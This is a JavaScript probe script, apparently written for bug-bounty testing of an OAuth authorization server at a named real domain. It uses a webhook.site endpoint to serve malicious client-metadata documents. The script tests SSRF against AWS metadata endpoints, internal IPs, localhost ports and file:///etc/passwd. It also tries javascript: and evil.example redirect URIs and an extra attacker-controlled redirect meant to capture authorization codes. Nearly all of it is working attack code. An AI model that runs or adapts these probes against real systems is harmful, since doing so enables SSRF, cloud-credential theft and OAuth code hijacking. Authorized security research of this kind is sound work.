const AS = "https://bugsecure-api.senintel.sn";
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const CH = "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM";
const UUID = "3ef992c0-b173-407f-ab55-e3ea613a534a";
const BASE = "https://webhook.site/" + UUID;

async function publish(doc) {
  await fetch("https://webhook.site/token/" + UUID, { method: "PUT", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ default_content: typeof doc === "string" ? doc : JSON.stringify(doc), default_content_type: "application/json" }) });
  await sleep(400);
}
async function authorizeDoc(clientId, label, extra = []) {
  const u = new URL(AS + "/oauth/authorize");
  u.searchParams.set("response_type", "code");
  u.searchParams.set("client_id", clientId);
  u.searchParams.set("redirect_uri", BASE + "/cb");
  u.searchParams.set("scope", "programs:read");
  u.searchParams.set("state", "bb-" + Math.random().toString(36).slice(2));
  u.searchParams.set("code_challenge", CH);
  u.searchParams.set("code_challenge_method", "S256");
  u.searchParams.set("resource", "https://bugsecure-api.senintel.sn");
  for (const [k, v] of extra) u.searchParams.append(k, v);
  const t0 = Date.now();
  const r = await fetch(u, { redirect: "manual" });
  const loc = r.headers.get("location") || "";
  const dt = Date.now() - t0;
  const q = new URLSearchParams(loc.split("?")[1] || "");
  const err = q.get("error") || "";
  const desc = (q.get("error_description") || "").slice(0, 150);
  const consent = loc.includes("/oauth/consent");
  console.log("  " + label.padEnd(40) + String(dt + "ms").padStart(7) + "  " + (consent ? "CONSENT-OK" : err || "loc:" + loc.slice(0, 60)) + (desc ? " | " + decodeURIComponent(desc) : ""));
  await sleep(1000);
  return { dt, err, desc, loc, consent };
}

console.log("=== A) taxonomie d erreurs AVEC resource (les vraies erreurs du client) ===");
const TAX = [
  ["CIMD valide", { client_id: BASE, client_name: "bb-valid", redirect_uris: [BASE + "/cb"], grant_types: ["authorization_code"], response_types: ["code"], token_endpoint_auth_method: "none" }],
  ["client_id != URL (echo ?)", { client_id: "MARQUEUR-ECHO-abc123", client_name: "bb", redirect_uris: [BASE + "/cb"] }],
  ["texte non JSON", "CORPS-INTERNE-SECRET-xyz789"],
  ["HTML", "<html><body>SECRET-INTERNAL-DATA</body></html>"],
  ["JSON casse", "{ broken json with SECRET-BROKEN"],
  ["client_name avec marqueur", { client_id: BASE, client_name: "NOM-MARQUEUR-42", redirect_uris: [BASE + "/cb"] }],
  ["redirect_uris = plateforme", { client_id: BASE, client_name: "bb", redirect_uris: ["https://bugsecure.senintel.sn/oauth/consent"] }],
  ["redirect_uris = IP literal", { client_id: BASE, client_name: "bb", redirect_uris: ["https://1.2.3.4/cb"] }],
  ["redirect_uris = javascript:", { client_id: BASE, client_name: "bb", redirect_uris: ["javascript:alert(1)"] }],
  ["redirect_uris = http non-loc", { client_id: BASE, client_name: "bb", redirect_uris: ["http://evil.example/cb"] }],
  ["scopes interdits", { client_id: BASE, client_name: "bb", redirect_uris: [BASE + "/cb"], scope: "admin:all triage:write" }],
  ["grant_types interdits", { client_id: BASE, client_name: "bb", redirect_uris: [BASE + "/cb"], grant_types: ["password", "implicit"] }],
  ["token_endpoint_auth_method=secret", { client_id: BASE, client_name: "bb", redirect_uris: [BASE + "/cb"], token_endpoint_auth_method: "client_secret_basic" }],
];
for (const [n, doc] of TAX) {
  await publish(doc);
  await authorizeDoc(BASE, n);
}

console.log("\n=== B) SSRF interne : la reponse de l AS differe-t-elle ? (latence + erreur) ===");
const INT = [
  ["webhook (externe)", BASE],
  ["IMDS AWS", "http://169.254.169.254/latest/meta-data/"],
  ["IMDS AWS v2 token", "http://169.254.169.254/latest/api/token"],
  ["IP prive 10.0.0.1", "http://10.0.0.1/"],
  ["TEST-NET 192.0.2.1", "http://192.0.2.1/"],
  ["localhost:80", "http://127.0.0.1/"],
  ["localhost:3000", "http://127.0.0.1:3000/"],
  ["localhost:53682 (MCP)", "http://127.0.0.1:53682/.well-known/oauth-protected-resource/mcp"],
  ["localhost:8099", "http://127.0.0.1:8099/"],
  ["file://", "file:///etc/passwd"],
  ["hote inexistant", "https://hote-inexistant-zzz.invalid/"],
];
for (const [n, url] of INT) {
  const runs = [];
  for (let i = 0; i < 2; i++) {
    try { runs.push(await authorizeDoc(url, n + (i ? " (2)" : ""))); }
    catch (e) { console.log("  " + n.padEnd(40) + "ERREUR RESEAU: " + e.message.slice(0, 60)); }
    await sleep(700);
  }
  const errs = [...new Set(runs.map((r) => r.err || (r.consent ? "CONSENT" : "?")))];
  console.log("      => erreurs: " + errs.join(",") + " | latences: " + runs.map((r) => r.dt).join(","));
}

console.log("\n=== C) le document peut-il Pointer le redirect vers NOTRE webhook avec un client_id arbitraire ? ===");
await publish({ client_id: BASE, client_name: "bb-redirect", redirect_uris: [BASE + "/cb", "https://webhook.site/8d363fca-3a17-47b7-aa05-d0172a17f14d/x"] });
await authorizeDoc(BASE, "2 redirect_uris dont un 2e webhook");
